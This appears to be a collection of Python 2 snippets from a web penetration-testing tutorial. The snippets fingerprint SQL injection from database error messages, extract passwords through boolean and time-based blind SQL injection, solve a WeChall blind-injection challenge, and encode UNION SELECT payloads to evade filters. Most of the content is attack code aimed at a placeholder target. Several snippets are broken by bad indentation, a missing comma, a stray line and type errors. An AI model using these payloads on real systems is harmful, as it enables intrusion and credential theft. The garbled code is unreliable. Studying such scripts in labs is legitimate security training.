["```py\nimport requests\nimport sys\nurl = sys.argv[1]\n\nvalues = []\n\nfor i in xrange(100): \n  r = requests.get(url)\n  values.append(int(r.elapsed.total_seconds()))\n\naverage = sum(values) / float(len(values))\nprint \u201cAverage response time for \u201c+url+\u201d is \u201c+str(average)\n```", "```py\nwhile i < 100:\n  r = requests.get(url)\n  values.append(int(r.elapsed.total_seconds()))\n  i = i + 1\n```", "```py\naverage = sum(values) / float(len(values))\nprint \u201cAverage response time for \u201c+url+\u201d is \u201c+average\n```", "```py\nimport requests\nimport sys\n\ninput = sys.argv[1]\n\ndef averagetimer(url):\n\n  i = 0\n  values = []\n\n  while i < 100:\n    r = requests.get(url)\n    values.append(int(r.elapsed.total_seconds()))\n    i = i + 1\n\n  average = sum(values) / float(len(values))\n  return average\n\naveragetimer(input)\n```", "```py\nimport requests\n\nurl = \u201chttp://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id=\u201d\ninitial = \u201c'\u201d\nprint \u201cTesting \u201c+ url\nfirst = requests.post(url+initial)\n\nif \u201cmysql\u201d in first.text.lower(): \n  print \u201cInjectable MySQL detected\u201d\nelif \u201cnative client\u201d in first.text.lower():\n  print \u201cInjectable MSSQL detected\u201d\nelif \u201csyntax error\u201d in first.text.lower():\n  print \u201cInjectable PostGRES detected\u201d\nelif \u201cORA\u201d in first.text.lower():\n  print \u201cInjectable Oracle detected\u201d\nelse:\n  print \u201cNot Injectable J J\u201d\n```", "```py\nTesting http://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id=\nInjectable MySQL detected\n\n```", "```py\nurl = \u201chttp://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id=\u201d\ninitial = \u201c'\u201d\nprint \u201cTesting \u201c+ url\n```", "```py\nfirst = requests.post(url+initial)\n```", "```py\nYou have an error in your SQL syntax; check the manual\nthat corresponds to your MySQL server version for the\nright syntax to use near '\\'' at line 1\n\n```", "```py\nif \u201cmysql\u201d in first.text.lower(): \n  print \u201cInjectable MySQL detected\u201d\n```", "```py\nMicrosoft SQL Native Client error '80040e14'\nUnclosed quotation mark after the character string\n\n```", "```py\nelif \u201cnative client\u201d in first.text.lower():\n  print \u201cInjectable MSSQL detected\u201d\n```", "```py\nQuery failed: ERROR: syntax error at or near\n\u201c'\u201d at character 56 in /www/site/test.php on line 121.\n\n```", "```py\nelif \u201csyntax error\u201d in first.text.lower():\n  print \u201cInjectable PostGRES detected\u201d\n```", "```py\nORA-00933: SQL command not properly ended\n\n```", "```py\nelif \u201cORA\u201d in first.text.lower():\n  print \u201cInjectable Oracle detected\u201d\n```", "```py\nimport requests\nimport sys\n\nyes = sys.argv[1]\n\ni = 1\nasciivalue = 1\n\nanswer = []\nprint \u201cKicking off the attempt\u201d\n\npayload = {'injection': '\\'AND char_length(password) = '+str(i)+';#', 'Submit': 'submit'}\n\nwhile True:\n  req = requests.post('<target url>' data=payload)\n  lengthtest = req.text\n  if yes in lengthtest:\n    length = i\n    break\n  else:\n    i = i+1\n\nfor x in range(1, length):\n  while asciivalue < 126:\npayload = {'injection': '\\'AND (substr(password, '+str(x)+', 1)) = '+ chr(asciivalue)+';#', 'Submit': 'submit'}\n      req = requests.post('<target url>', data=payload)\n      if yes in req.text:\n    answer.append(chr(asciivalue))\nbreak\n  else:\n      asciivalue = asciivalue + 1\n      pass\nasciivalue = 0\nprint \u201cRecovered String: \u201c+ ''.join(answer)\n```", "```py\nyes = sys.argv[1]\n\ni = 1\nasciivalue = 1\nanswer = []\nprint \u201cKicking off the attempt\u201d\n```", "```py\npayload = {'injection': '\\'AND char_length(password) = '+str(i)+';#', 'Submit': 'submit'}\n```", "```py\nwhile True:\n  req = requests.post('<target url>' data=payload)\n```", "```py\nlengthtest = req.text\n  if yes in lengthtest:\n    length = i\n    break\n```", "```py\nArd.\nelse:\n    i = i+1\n```", "```py\nfor x in range(1, length):\n  while asciivalue < 126:\npayload = {'injection': '\\'AND (substr(password, '+str(x)+', 1)) = '+ chr(asciivalue)+';#', 'Submit': 'submit'}\n    req = requests.post('<target url>', data=payload)\n```", "```py\nif yes in req.text:\n    answer.append(chr(asciivalue))\nbreak\n```", "```py\nelse:\n      asciivalue = asciivalue + 1\n      pass\n```", "```py\nasciivalue = 1\nprint \u201cRecovered String: \u201c+ ''.join(answer)\n```", "```py\nimport requests\n\ntimes = []\nprint \u201cKicking off the attempt\u201d\ncookies = {'cookie name': 'Cookie value'}\n\npayload = {'injection': '\\'or sleep char_length(password);#', 'Submit': 'submit'}\nreq = requests.post('<target url>' data=payload, cookies=cookies)\nfirstresponsetime = str(req.elapsed.total_seconds)\n\nfor x in range(1, firstresponsetime):\n  payload = {'injection': '\\'or sleep(ord(substr(password, '+str(x)+', 1)));#', 'Submit': 'submit'}\n  req = requests.post('<target url>', data=payload, cookies=cookies)\n  responsetime = req.elapsed.total_seconds\n  a = chr(responsetime)\n    times.append(a)\n    answer = ''.join(times)\nprint \u201cRecovered String: \u201c+ answer\n```", "```py\ntimes = []\nprint \u201cKicking off the attempt\u201d\ncookies = {'cookie name': 'Cookie value'}\n```", "```py\npayload = {'injection': '\\'or sleep char_length(password);#', 'Submit': 'submit'}\n```", "```py\nfirstresponsetime = str(req.elapsed).total_seconds\n```", "```py\nfor x in range(1, firstresponsetime):\n```", "```py\npayload = {'injection': '\\'or sleep(ord(substr(password, '+str(x)+', 1)));#', 'Submit': 'submit'}\n```", "```py\nreq = requests.post('<target url>', data=payload, cookies=cookies)\n```", "```py\nresponsetime = req.elapsed.total_seconds\n  a = chr(responsetime)\n```", "```py\nanswer = ''.join(times)\nprint \u201cRecovered String: \u201c+ answer\n```", "```py\nimport subprocess\nimport requests\n\ndef round_down(num, divisor):\n    return num - (num%divisor)\n\nsubprocess.Popen([\u201cmodprobe pcspkr\u201d], shell=True)\nsubprocess.Popen([\u201cbeep\u201d], shell=True)\n\nvalues = {'0': '0', '25': '1', '50': '2', '75': '3', '100': '4', '125': '5', '150': '6', '175': '7', '200': '8', '225': '9', '250': 'A', '275': 'B', '300': 'C', '325': 'D', '350': 'E', '375': 'F'}\ntimes = []\nanswer = \u201cThis is the first time\u201d\ncookies = {'wc': 'cookie'}\nsetup = requests.get ('http://www.wechall.net/challenge/blind_lighter/index .php?mo=WeChall&me=Sidebar2&rightpanel=0', cookies=cookies)\ny=0\naccum=0\n\nwhile 1:\n  reset = requests.get('http://www.wechall.net/challenge/blind_lighter/ index.php?reset=me', cookies=cookies)\n  for line in reset.text.splitlines():\n    if \u201clast hash\u201d in line:\n      print \u201cthe old hash was:\u201d+line.split(\u201c \u201c)[20].strip(\u201c.</li>\u201d)\n      print \u201cthe guessed hash:\u201d+answer\n      print \u201cAttempts reset \\n \\n\u201d\n    for x in range(1, 33):\n      payload = {'injection': '\\'or IF (ord(substr(password, '+str(x)+', 1)) BETWEEN 48 AND 57,sleep((ord(substr(password, '+str(x)+', 1))- 48)/4),sleep((ord(substr(password, '+str(x)+', 1))- 55)/4));#', 'inject': 'Inject'}\n      req = requests.post ('http://www.wechall.net/challenge/blind_lighter/ index.php?ajax=1', data=payload, cookies=cookies)\n      responsetime = str(req.elapsed)[5]+str(req.elapsed)[6]+str(req.elapsed)[8]+ str(req.elapsed)[9]\n      accum = accum + int(responsetime)\n      benchmark = int(15)\n      benchmarked = int(responsetime) - benchmark\n      rounded = str(round_down(benchmarked, 25))\n      if rounded in values:\n        a = str(values[rounded])\n        times.append(a)\n        answer = ''.join(times)\n      else:\n        print rounded\n        rounded = str(\u201c375\u201d)\n        a = str(values[rounded])\n        times.append(a)\n        answer = ''.join(times)\n  submission = {'thehash': str(answer), 'mybutton': 'Enter'}\n  submit = requests.post('http://www.wechall.net/challenge/blind_lighter/ index.php', data=submission, cookies=cookies)\n  print \u201cAttempt: \u201c+str(y)\n  print \u201cTime taken: \u201c+str(accum)\n  y += 1\n  for line in submit.text.splitlines():\n    if \u201cslow\u201d in line:\n      print line.strip(\u201c<li>\u201d)\n    elif \u201cwrong\u201d in line:\n      print line.strip(\u201c<li>\u201d)\n  if \u201cwrong\u201d not in submit.text:\n    print \u201cpossible success!\u201d\n    #subprocess.Popen([\u201cbeep\u201d], shell=True)\n```", "```py\nsubs = []\nvalues = {\u201c \u201c: \u201c%50\u201d, \u201cSELECT\u201d: \u201cHAVING\u201d, \u201cAND\u201d: \u201c&&\u201d, \u201cOR\u201d: \u201c||\u201d}\noriginalstring = \u201c' UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin';#\u201d\nsecondoriginalstring = originalstring\nfor key, value in values.iteritems():\n  if key in originalstring:\n    newstring = originalstring.replace(key, value)\n    subs.append(newstring)\n  if key in secondoriginalstring:\n    secondoriginalstring = secondoriginalstring.replace(key, value)\n    subs.append(secondoriginalstring)\n\nsubset = set(subs)\nfor line in subs:\n  print line\n```", "```py\nsubs = []\nvalues = {\u201c \u201c: \u201c%50\u201d, \u201c%20\u201d: \u201c%50\u201d, \u201cSELECT\u201d: \u201cHAVING\u201d, \u201cAND\u201d: \u201c&&\u201d, \u201cOR\u201d: \u201c||\u201d}\n```", "```py\noriginalstring = \u201c'%20UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin';#\u201d\n```", "```py\nsecondoriginalstring = originalstring\n```", "```py\nfor key, value in values.iteritems():\n```", "```py\nif key in originalstring:\n    newstring = originalstring.replace(key, value)\n```", "```py\nsubs.append(newstring)\n```", "```py\nif key in secondoriginalstring:\n    secondoriginalstring = secondoriginalstring.replace(key, value)\n    subs.append(secondoriginalstring)\n```", "```py\nsubset = set(subs)\nfor line in subs:\n  print line\n```", "```py\ndef encoder(string):\n\nsubs = []\nvalues = {\u201c \u201c: \u201c%50\u201d, \u201cSELECT\u201d: \u201cHAVING\u201d, \u201cAND\u201d: \u201c&&\u201d, \u201cOR\u201d: \u201c||\u201d}\noriginalstring = \u201c' UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin'\u201d\nsecondoriginalstring = originalstring\nfor key, value in values.iteritems():\n  if key in originalstring:\n    newstring = originalstring.replace(key, value)\n    subs.append(newstring)\n  if key in secondoriginalstring:\n    secondoriginalstring = secondoriginalstring.replace(key, value)\n    subs.append(secondoriginalstring)\n\nsubset = set(subs)\nreturn subset\n```"]